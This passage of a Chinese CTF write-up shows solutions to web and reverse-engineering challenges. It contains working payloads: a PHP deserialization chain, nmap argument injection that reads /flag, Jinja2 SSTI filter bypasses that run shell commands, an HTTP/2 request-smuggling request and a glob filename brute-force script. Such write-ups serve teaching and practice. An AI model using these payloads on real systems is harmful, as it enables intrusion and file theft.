class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Me</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;qwe = <span class="keyword">new</span> her;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;bro = &amp;<span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">her</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$hername</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;asd = <span class="keyword">new</span> important;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">important</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;power = <span class="keyword">new</span> useless;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">useless</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$seeyou</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$YXX</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;seeyou = <span class="keyword">array</span>(<span class="string">&#x27;seeyou&#x27;</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> hez,<span class="string">&#x27;find&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hez</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$hername</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hername = <span class="string">&#x27;momo&#x27;</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;key = <span class="string">&#x27;9&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Me</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p><code>phpinfo()</code>，修改引用11为13：</p><p><code>C:11:%22ArrayObject%22:260:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Bs%3A7%3A%22phpinfo%22%3B%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A13%3B%7D;m:a:0:&#123;&#125;&#125;</code></p><p>修改引用16为18，改hez为her：</p><p><code>C:11:%22ArrayObject%22:351:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BN%3B%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A18%3B%7D;m:a:0:&#123;&#125;&#125;</code></p><p>最终payload，列目录：</p><p><code>?user=C:11:%22ArrayObject%22:351:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BN%3B%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A18%3B%7D;m:a:0:&#123;&#125;&#125;&amp;file=data://text/plain,loveyou&amp;fun=glob://f*</code></p><p>POST: <code>ctf=DirectoryIterator</code></p><p>得到flag文件名为 <code>flag_my_baby.php</code>。</p><p>再读flag文件：</p><p><code>?user=C:11:%22ArrayObject%22:351:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BN%3B%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A18%3B%7D;m:a:0:&#123;&#125;&#125;&amp;file=data://text/plain,loveyou&amp;fun=php://filter/convert.base64-encode/resource=flag_my_baby.php</code></p><p>POST: <code>ctf=SplFileObject</code></p><p>结果base64解码即得flag。</p><p>​    </p><h3 id="scan-tool"><a href="#scan-tool" class="headerlink" title="scan_tool"></a>scan_tool</h3><blockquote><p>nmap也太好用了！不是吧，你还不会用吗？</p></blockquote><p>过滤了 <code>?  php flag iL oN</code></p><p>参考：<a href="https://blog.csdn.net/qq_43801002/article/details/107746582">[网鼎杯 2020 朱雀组]Nmap</a></p><p>使用nmap读文件，选项 <code>-oA</code>，该选项可将扫描结果以标准格式、XML格式和Grep格式一次性保存，分别放在.nmap，.xml和.gnmap文件中。</p><p>使用 <code>?ip=127.0.0.1&#39; -i /fl&quot;&quot;ag -oA 1 &#39;</code>，再访问 <code>1.nmap</code> 得到flag。</p><p>​    </p><h3 id="klf-2"><a href="#klf-2" class="headerlink" title="klf_2"></a>klf_2</h3><blockquote><p>”可恶，我不信，我绝对不是klf，你们才是，哈哈这次我卷土重来了，你们肯定是klf，我要向女神证明自己…“</p></blockquote><p><code>robots.txt</code> 得路由 <code>/secr3ttt</code>，测试过滤关键字有：</p><p><code>[ ] _  &#39; &quot; \ config init globals os import request open read 0 137 pop</code></p><p>列目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pp=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set ppe=dict(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;% set gt=dict(ge=a,t=a)|join%&#125;</span><br><span class="line">&#123;% set so=dict(o=a,s=a)|join %&#125;</span><br><span class="line">&#123;% set rd=dict(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;</span><br><span class="line">&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set cr=dict(ch=a,r=a)|join%&#125;</span><br><span class="line">&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;</span><br><span class="line">&#123;% set sp=char(32)%&#125;</span><br><span class="line">&#123;% set d=char(4７)%&#125;</span><br><span class="line">&#123;% set op=(dict(ls=a)|join,sp,d,dict(ap=a,p=a)|join)|join %&#125;</span><br><span class="line">&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;</span><br><span class="line">&#123;%print(f)%&#125;</span><br></pre></td></tr></table></figure><p>得到flag文件名 <code>fl4gfl4gfl4g</code>，再读flag文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pp=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set ppe=dict(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;% set gt=dict(ge=a,t=a)|join%&#125;</span><br><span class="line">&#123;% set so=dict(o=a,s=a)|join %&#125;</span><br><span class="line">&#123;% set rd=dict(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;</span><br><span class="line">&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set cr=dict(ch=a,r=a)|join%&#125;</span><br><span class="line">&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;</span><br><span class="line">&#123;% set sp=char(32)%&#125;</span><br><span class="line">&#123;% set d=char(4７)%&#125;</span><br><span class="line">&#123;% set op=(dict(c=a,at=a)|join,sp,d,dict(ap=a,p=a)|join,d,dict(fl4gfl4gfl4g=a)|join)|join %&#125;</span><br><span class="line">&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;</span><br><span class="line">&#123;%print(f)%&#125;</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="EZ-Smuggling"><a href="#EZ-Smuggling" class="headerlink" title="EZ_Smuggling"></a>EZ_Smuggling</h3><blockquote><p>这是一个简单的H2转H1的小网站，站长认为他很安全，没有人能在他的网站走私任何东西。 题目链接:<a href="https://47.108.56.168:20231/">https://47.108.56.168:20231/</a> 备用链接1:<a href="https://47.108.56.168:20232/">https://47.108.56.168:20232/</a> 备用链接2:<a href="https://47.108.56.168:20233/">https://47.108.56.168:20233/</a></p></blockquote><p>H2.CL请求走私，参考：</p><p><a href="https://sc.scomurr.com/http-request-smuggling-http-2-downgrade-attack-part-2/">HTTP Request Smuggling – HTTP/2 Downgrade Attack Part 2</a></p><p>构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/2</span><br><span class="line">Host: 47.108.56.168:20231</span><br><span class="line">Cookie: session=MTcwMDQ5OTczNnwzRERyQTlLa0hLMlp4YW9McS1yOHh6VVFHQktaRHdWREc2cEtlNTZwTG5XMV9Ic0lGd3h1QzhCNkkxeFJLLXlYYlN0enhQdWpHRkltTjhfUEhEdThMejdKMFJ5YmVaMFV8Zx0CM7urEt3li5yAVGtbS4fn-CoU8kNQ2W_IosQOhg8=</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: 47.108.56.168:20231</span><br><span class="line">Cookie: session=MTcwMDQ5OTczNnwzRERyQTlLa0hLMlp4YW9McS1yOHh6VVFHQktaRHdWREc2cEtlNTZwTG5XMV9Ic0lGd3h1QzhCNkkxeFJLLXlYYlN0enhQdWpHRkltTjhfUEhEdThMejdKMFJ5YmVaMFV8Zx0CM7urEt3li5yAVGtbS4fn-CoU8kNQ2W_IosQOhg8=</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p>即可得flag：<code>SYC&#123;http2_5muggl1ng_15_1nt3r3st1ng&#125;</code>。</p><p>​    </p><h3 id="klf-3"><a href="#klf-3" class="headerlink" title="klf_3"></a>klf_3</h3><blockquote><p>”好好好这都给你们做出来了，这次我拜托了pursue0h帮我收集了你们前几次的payload，这次绝对不可能让你们做出来，你们绝对是klf“</p></blockquote><p><code>robots.txt</code>  得到路由 <code>/secr3ttt</code>，同klf_2相同打法即可。</p><p>列目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pp=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set ppe=dict(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;% set gt=dict(ge=a,t=a)|join%&#125;</span><br><span class="line">&#123;% set so=dict(o=a,s=a)|join %&#125;</span><br><span class="line">&#123;% set rd=dict(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;</span><br><span class="line">&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set cr=dict(ch=a,r=a)|join%&#125;</span><br><span class="line">&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;</span><br><span class="line">&#123;% set sp=char(32)%&#125;</span><br><span class="line">&#123;% set d=char(4７)%&#125;</span><br><span class="line">&#123;% set op=(dict(ls=a)|join,sp,d,dict(ap=a,p=a)|join)|join %&#125;</span><br><span class="line">&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;</span><br><span class="line">&#123;%print(f)%&#125;</span><br></pre></td></tr></table></figure><p>得到flag文件名 <code>fl4gfl4gfl4g</code>，再读flag文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pp=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set ppe=dict(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;% set gt=dict(ge=a,t=a)|join%&#125;</span><br><span class="line">&#123;% set so=dict(o=a,s=a)|join %&#125;</span><br><span class="line">&#123;% set rd=dict(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;</span><br><span class="line">&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set cr=dict(ch=a,r=a)|join%&#125;</span><br><span class="line">&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;</span><br><span class="line">&#123;% set sp=char(32)%&#125;</span><br><span class="line">&#123;% set d=char(4７)%&#125;</span><br><span class="line">&#123;% set op=(dict(c=a,at=a)|join,sp,d,dict(ap=a,p=a)|join,d,dict(fl4gfl4gfl4g=a)|join)|join %&#125;</span><br><span class="line">&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;</span><br><span class="line">&#123;%print(f)%&#125;</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Akane"><a href="#Akane" class="headerlink" title="Akane!"></a>Akane!</h3><blockquote><p>最适合梅菲斯特的一题</p></blockquote><p>glob协议侧信道爆破文件名。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Idol</span>:</span><br><span class="line">    public_Akane=<span class="string">&#x27;glob:///etc/passss&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hoshino</span>:</span><br><span class="line">    public_Ruby=Idol()</span><br><span class="line"></span><br><span class="line">res = res.replace(<span class="string">b&#x27;&quot;Hoshino&quot;:1&#x27;</span>,<span class="string">b&#x27;&quot;Hoshino&quot;:2&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(res))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:7:&quot;Hoshino&quot;:1:&#123;s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:&#123;s:5:&quot;Akane&quot;;s:18:&quot;glob:///etc/passwd&quot;;&#125;&#125;</span></span><br><span class="line"><span class="comment"># 绕wakeup</span></span><br><span class="line"><span class="comment"># O:7:&quot;Hoshino&quot;:2:&#123;s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:&#123;s:5:&quot;Akane&quot;;s:18:&quot;glob:///etc/passwd&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://zwgadnbkohe7t6xz02urbct9b.node.game.sycsec.com/?tuizi=&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;/var/www/html/The************************.php&#x27;</span></span><br><span class="line">dic = string.printable</span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        guess = <span class="string">f&#x27;glob:///var/www/html/The<span class="subst">&#123;name+j&#125;</span><span class="subst">&#123;<span class="string">&quot;*&quot;</span>*(<span class="number">23</span>-<span class="built_in">len</span>(name))&#125;</span>.php&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;O:7:&quot;Hoshino&quot;:2:&#123;&#123;s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:&#123;&#123;s:5:&quot;Akane&quot;;s:<span class="subst">&#123;<span class="built_in">len</span>(guess)&#125;</span>:&quot;<span class="subst">&#123;guess&#125;</span>&quot;;&#125;&#125;&#125;&#125;&#x27;</span>.encode()</span><br><span class="line">        r = requests.get(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span><span class="subst">&#123;base64.b64encode(payload).decode()&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Kurokawa Akane&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            name += j</span><br><span class="line">            <span class="built_in">print</span>(name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># S4crEtF1AgFi1EByo2takuXX</span></span><br></pre></td></tr></table></figure><p>再访问 <code>/var/www/html/TheS4crEtF1AgFi1EByo2takuXX.php</code> 即可得flag。</p><p>​    </p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="shiftjmp"><a href="#shiftjmp" class="headerlink" title="shiftjmp"></a>shiftjmp</h3><blockquote><p>跳到哪里去了？</p></blockquote><p>用IDA解析程序崩溃，改用Ghidra解析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  uint uVar1;</span><br><span class="line">  uint uStack12;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;flag:&quot;</span>);</span><br><span class="line">  uStack12 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x21</span> &lt; (<span class="type">int</span>)uStack12) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    uVar1 = func_0x00101070();</span><br><span class="line">    <span class="keyword">if</span> ((uVar1 ^ uStack12) != (<span class="type">int</span>)(<span class="type">char</span>)rodata[uStack12]) <span class="keyword">break</span>;</span><br><span class="line">    uStack12 = uStack12 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑为简单异或操作，还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rodata = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;5358417853366a6438646f547842517b78224d61276373452d7c456c2c6f2f7b5e5c&#x27;</span>))</span><br><span class="line">flag = [rodata[i]^i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;W3lc0me_tO_th3_r3veR5e_w0r1d~&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="点击就送的逆向题"><a href="#点击就送的逆向题" class="headerlink" title="点击就送的逆向题"></a>点击就送的逆向题</h3><blockquote><p>代码如何到可执行二进制文件?(记得将得到的正确字符串包裹上SYC{}!!!!!!!)</p></blockquote><p>将s文件编译：<code>gcc xxx.s -o xxx</code></p><p>关键代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="built_in">strcpy</span>(s2, <span class="string">&quot;Z`J[X^LMNO`PPJPVQRSIUTJ]IMNOZKMM&quot;</span>);</span><br><span class="line">__isoc99_scanf(&amp;unk_2004, s1);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  s1[i] += <span class="number">7</span>;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s2) )</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;good!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>逻辑为ROT7，cyberchef还原为 <code>SYCTQWEFGHYIICIOJKLBNMCVBFGHSDFF</code>。</p><p>flag：<code>SYC&#123;SYCTQWEFGHYIICIOJKLBNMCVBFGHSDFF&#125;</code></p><p>​    </p><h3 id="easymath"><a href="#easymath" class="headerlink" title="easymath"></a>easymath</h3><blockquote><p>别担心，没学过线性代数也可以做出来，听说z3老师很厉害。flag请使用SYC{}包裹。</p></blockquote><p>前部分代码为 $\mathbb{Z}_{32}$ 下矩阵乘法：$L \cdot M = I$</p><p>后部分代码，根据代码测试代码逻辑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;c01234_asdzxpoityumnbAOZWXGMY&#x27;</span></span><br><span class="line">table = <span class="string">&#x27;01234_asdzxcpoityumnbAOZWXGMY&#x27;</span></span><br><span class="line">pos = [table.index(flag[i])+<span class="number">48</span> 